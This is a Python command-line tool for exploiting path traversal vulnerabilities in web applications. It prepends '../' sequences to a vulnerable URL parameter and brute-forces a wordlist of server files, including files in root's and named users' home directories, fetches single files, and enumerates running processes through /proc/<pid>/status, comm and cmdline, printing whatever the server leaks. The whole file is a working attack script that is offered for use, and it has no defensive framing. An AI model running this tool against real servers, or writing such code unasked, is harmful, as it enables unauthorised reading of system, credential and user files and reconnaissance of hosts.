#!/bin/python3
#path traversal enumeration
import requests
import argparse
import sys
import re
from bs4 import BeautifulSoup
from os import system,name,path
import pandas as pd

args = None

if name == "nt":
	system('color')

RSTCOLORS = '\033[0m'
BOLD = '\033[1m'

def get_request(item, host):
	url=host+item
	try:
		if args.quiet is False:
			print("[*] Trying",url)
		r = requests.get(url=url)
		if r.status_code == 200 and r.text != "":
			return r.text
		else:
			pass
			#print(r)
	except Exception as e:
		if args.quiet is False:
			print("[-] Oops, Unable to Process the Get Request")
			print(e)

def parse(container, html):
	if container is not None:
		soup = BeautifulSoup(html,'lxml')
		
		if "," in container:
			container_gp = container.split(",")
			element = container_gp[0]
			attr = container_gp[1].split("=")[0]
			attr_value = container_gp[1].split("=")[1]
			matches = soup.find(element,{attr:attr_value.strip('"')})
			#print(element,attr,attr_value)
			soup = BeautifulSoup(str(matches),'lxml')
			print(soup.get_text(separator="\n"))
		else:
			element = container
			matches = soup.find(element)
			soup = BeautifulSoup(str(matches),'lxml')
			print(soup.get_text(separator="\n"))

def main():
	global args
	pt_list = []
	parser = argparse.ArgumentParser(description="Get juicy info through path traversal vulnerabilities")
	group1 = parser.add_mutually_exclusive_group(required=True)
	parser.add_argument('--base-url',action='store', dest='host',type=str,help='Vulnerable host and path - http://<server>/path.php=',required=True)
	parser.add_argument('--path',action='store',dest='path',type=str,help='Prefix path to prepend to all requests - ../../../',required=False,default='')
	parser.add_argument('--container',action='store', dest='container',type=str,help='The html element that contains the results:  table,class="code" | table,id="code"',default=None,required=False)
	parser.add_argument('--not-found-string',action='store', dest='not_found',type=str,help='A string to indicate failure or "None',required=False,default=None)
	group1.add_argument('--list',action='store', dest='list',type=str,help='File with lists of file to bruteforce')
	group1.add_argument('--file',action='store', dest='file',type=str,help='Single server file to try to access',default=None)
	group1.add_argument('--enum-proc',action='store', dest='procs',type=str,help='<start proc#>,<end proc#> : 1,9000',required=False,default=None)
	parser.add_argument('--users',action='store', dest='users',nargs="+",help='root user1 user2',default='root')
	parser.add_argument('-q','--quiet',action='store_true', dest='quiet',help='supress messages',default=False)

	args = parser.parse_args()
	if args.users == "root":
		users_list = ["root"]
	else:
		users_list = args.users

	if args.container is not None:
		container = args.container.split(",")

	if args.list is not None:
		filename = args.list
		if path.isfile(filename):
			with open(filename,'r') as file_obj:
				for line in file_obj:		#loads lines into a list
					if "~/" in line:
						for user in users_list:
							temp_line = line
							if user != "root":
								pt_list.append(temp_line.replace("~/","/home/"+user+"/"))
							elif user == "root":
								pt_list.append(temp_line.replace("~/","/root/"))
					else:
						pt_list.append(line)
				for line in pt_list:
					try:
						html = get_request(args.path+line.rstrip(),args.host)
						if html:
							url = args.host+args.path+line.rstrip()
							if args.not_found is not None:
								if args.not_found not in html:
									if args.quiet is False:
										print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
									parse(args.container,html)
							else:
								if args.quiet is False:
									print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
								if args.container is not None:
									parse(args.container,html)

								else:
									print(html)
					except:
						break
		else:
			if args.quiet is False:
				print("[-] Unable to find file -->",filename)
			sys.exit()

	elif args.file is not None:
		html = get_request(args.path+args.file,args.host)
		if html:
			url = args.host+args.path+args.file.rstrip()
			if args.not_found is not None:
				if args.not_found not in html:
					print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
					parse(args.container,html)
			else:
				if args.quiet is False:
					print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
				if args.container is not None:
					parse(args.container,html)

				else:
					print(html)


	elif args.procs is not None:
		results = []
		start = int(args.procs.split(',')[0])
		end = int(args.procs.split(',')[1])
		for i in range(start,end+1):
			uri = "{}/proc/{}/status".format(args.path,i)
			text = get_request(uri,args.host)

			if text:
				attr_list = ["comm","cmdline"]
				for attr in attr_list:
					uri = "{}/proc/{}/{}".format(args.path,i,attr)
					text = get_request(uri,args.host)
					if text:	
						url = args.host + uri
						if args.quiet is False:
							print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
						#print(text.rstrip())
				
						results.append([text.rstrip(),i])
				#print()
				
		proc_df = pd.DataFrame(results,columns=['PROC_NAME','PID'])
		proc_df.style.hide_index()
		print(proc_df.to_string(index = False))

main()
